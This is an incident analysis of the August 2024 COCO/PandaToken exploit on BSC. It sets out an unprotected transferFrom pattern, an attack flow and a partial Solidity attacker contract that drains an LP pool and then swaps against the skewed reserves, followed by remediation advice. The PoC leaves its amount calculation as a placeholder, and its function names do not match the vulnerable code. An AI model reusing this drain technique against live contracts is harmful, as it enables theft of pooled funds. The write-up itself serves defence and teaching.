# COCO (Panda Token) — LP Pool Drain via Arbitrary transferFrom Analysis

| Item | Details |
|------|------|
| **Date** | 2024-08-14 |
| **Protocol** | COCO / PandaToken |
| **Chain** | BSC |
| **Loss** | ~280 BNB |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | Address unconfirmed |
| **Root Cause** | Vulnerable contract allowed arbitrary transferFrom, enabling direct transfer of LP pool balance followed by swap |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/COCO_exp.sol) |

---

## 1. Vulnerability Overview

The vulnerable contract in the COCO/PandaToken protocol allowed arbitrary `transferFrom` calls, enabling direct withdrawal of USDT from the PancakeSwap LP pool. The attacker used an `AttackerC` contract to directly move the LP pool's USDT balance to themselves, then called the LP pool's `swap()` function to exploit the resulting reserve imbalance and acquire a large amount of PandaToken.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: executes transferFrom from an arbitrary address for an arbitrary amount
function drainFunds(address token, address from, address to, uint256 amount) external {
    // ❌ No caller validation — anyone can move another party's assets
    IERC20(token).transferFrom(from, to, amount);
}

// ✅ Correct code: access control + only allowed tokens/addresses
function drainFunds(address token, address from, address to, uint256 amount) external {
    require(msg.sender == owner, "Not owner");  // ✅ Access control
    require(allowedTokens[token], "Token not allowed");  // ✅ Allowed tokens only
    require(amount <= withdrawLimit, "Exceeds limit");  // ✅ Amount limit
    IERC20(token).transferFrom(from, to, amount);
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: COCO_decompiled.sol
contract COCO {
    function transfer(address p0, uint256 p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Deploy AttackerC contract
  │
  ├─[2]─► Query USDT balance of LP pool (PancakeSwap Pair) via vulnerable contract
  │         └─► USDT.balanceOf(LP_PAIR) = X USDT
  │
  ├─[3]─► Execute arbitrary transferFrom via vulnerable contract
  │         └─► USDT.transferFrom(LP_PAIR, address(this), X USDT)
  │               └─► Directly moves LP pool's USDT to attacker
  │
  ├─[4]─► Call LP pool swap()
  │         └─► Acquire large amount of PandaToken using manipulated reserves
  │
  ├─[5]─► Swap PandaToken → USDT to realize profit
  │
  └─[6]─► Total loss: ~280 BNB
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackerC {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair LP_PAIR;

    constructor(address _pair, address vulnContract) {
        LP_PAIR = IPancakePair(_pair);

        // [3] Directly move LP pool's USDT balance (exploiting vulnerable contract)
        uint256 lpUsdtBal = USDT.balanceOf(address(LP_PAIR));
        IVulnContract(vulnContract).transferFrom(
            address(USDT),
            address(LP_PAIR),
            address(this),
            lpUsdtBal
        );

        // [4] Acquire large amount of PandaToken by exploiting reserve imbalance
        (uint112 r0, uint112 r1,) = LP_PAIR.getReserves();
        uint256 pandaOut = /* calculated based on manipulated reserves */;
        LP_PAIR.swap(pandaOut, 0, address(this), "");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Technique** | Arbitrary transferFrom + LP Reserve Manipulation |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Mandatory Access Control**: Token transfer functions must enforce `onlyOwner` or role-based access control.
2. **Restrict `from` Address**: Ensure the `from` parameter of `transferFrom` cannot point to external critical contracts such as LP pools.
3. **Protect LP Pool Balance**: Since LP pool balances can be altered directly, call `sync()` or validate reserves accordingly.
4. **Token Allowlist**: Restrict processable tokens to a pre-approved allowlist.

## 7. Lessons Learned

- **LP Pool Vulnerability**: PancakeSwap LP pools allow tokens to be sent directly from the outside, which can be exploited to manipulate reserves.
- **Prohibit Arbitrary transferFrom**: Any contract functionality that moves arbitrary tokens from arbitrary addresses is extremely dangerous.
- **Access Control Fundamentals**: Missing access control is one of the most common and critical vulnerabilities in DeFi protocols.